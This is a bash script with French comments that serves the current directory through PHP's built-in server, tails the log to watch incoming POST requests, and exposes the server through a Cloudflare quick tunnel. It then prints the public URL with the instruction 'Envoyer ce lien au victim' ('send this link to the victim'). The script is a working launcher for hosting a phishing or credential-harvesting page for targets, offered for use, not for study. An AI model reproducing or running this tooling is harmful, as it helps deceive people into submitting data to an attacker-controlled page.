#!/bin/bash
set -euo pipefail

PHP_LOG="/tmp/php_server.log"
CF_LOG="/tmp/cloudflared.log"

HOST="localhost"
PORT=8080
PHP_DOCROOT="$(pwd)"   # change si besoin
TIMEOUT=25
INTERVAL=1

cleanup() {
  echo
  echo "Arrêt des processus..."
  [ -n "${TAIL_PID-}" ] && kill "$TAIL_PID" 2>/dev/null || true
  [ -n "${CF_PID-}" ] && kill "$CF_PID" 2>/dev/null || true
  [ -n "${PHP_PID-}" ] && kill "$PHP_PID" 2>/dev/null || true
  exit 0
}
trap cleanup INT TERM

if ! command -v php >/dev/null 2>&1; then
  echo "Erreur: php n'est pas installé. Installe avec : sudo apt install php"
  exit 1
fi

echo "Démarrage du serveur PHP sur $HOST:$PORT..."
rm -f "$PHP_LOG"

# Lancer PHP en arrière-plan, log stdout+stderr vers $PHP_LOG
php -S "${HOST}:${PORT}" -t "$PHP_DOCROOT" >"$PHP_LOG" 2>&1 &
PHP_PID=$!
echo "PHP lancé (pid: $PHP_PID). Log: $PHP_LOG"

# Tail du log PHP pour voir en temps réel les POST / echo / error_log
tail -n 0 -F "$PHP_LOG" &
TAIL_PID=$!
echo "(tail pid: $TAIL_PID)."

# Petite attente puis vérif que PHP écoute
sleep 1
if command -v ss >/dev/null 2>&1; then
  if ! ss -ltn "( sport = :$PORT )" | grep -q "$PORT"; then
    echo "Attention: le serveur PHP ne semble pas écouter sur le port $PORT."
    echo "Voir les dernières lignes du log PHP :"
    tail -n 30 "$PHP_LOG" || true
    cleanup
  fi
fi

# Lancer cloudflared
rm -f "$CF_LOG"
echo "Lancement de cloudflared (pointant vers http://$HOST:$PORT)..."
cloudflared tunnel --url "http://$HOST:$PORT" >"$CF_LOG" 2>&1 &
CF_PID=$!
echo "cloudflared lancé (pid: $CF_PID). Log: $CF_LOG"

# Chercher l'URL publique
found=""
elapsed=0
while [ $elapsed -lt $TIMEOUT ]; do
  if [ -s "$CF_LOG" ]; then
    found=$(grep -Eo 'https?://[^[:space:]]+' "$CF_LOG" \
            | grep -E 'trycloudflare|cfargotunnel' \
            | head -n1 || true)
    if [ -n "$found" ]; then
      break
    fi
  fi
  sleep "$INTERVAL"
  elapsed=$((elapsed + INTERVAL))
done

if [ -n "$found" ]; then
  echo
  echo "==== Tunnel créé ===="
  echo "Envoyer ce lien au victim : $found"
  echo
  echo "Appuie sur Ctrl+C pour arrêter le serveur et cloudflared."
  # Rester en avant-plan : attend que les processus enfants (php/cloudflared/tail) se terminent
  wait
else
  echo "Erreur : aucune URL publique trouvée dans $CF_LOG après ${TIMEOUT}s."
  echo "Dernières lignes du log cloudflared :"
  echo "-------"
  tail -n 80 "$CF_LOG" 2>/dev/null || true
  echo "-------"
  cleanup
fi
